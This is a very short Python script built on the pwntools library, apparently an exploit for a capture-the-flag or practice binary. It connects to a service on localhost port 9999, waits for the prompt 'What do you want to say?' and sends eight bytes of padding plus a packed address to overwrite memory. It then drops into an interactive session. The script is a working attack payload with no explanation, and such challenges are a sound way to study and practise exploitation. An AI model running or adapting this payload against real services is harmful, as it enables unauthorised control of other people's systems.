from pwn import *
import sys
context.log_level = 'DEBUG'

# p = process('./pwn')
p = remote('127.0.0.1', 9999)


#gdb.attach(p)

p.sendlineafter('What do you want to say?', b'a'*8+p32(0x0804D028+4))

p.interactive()
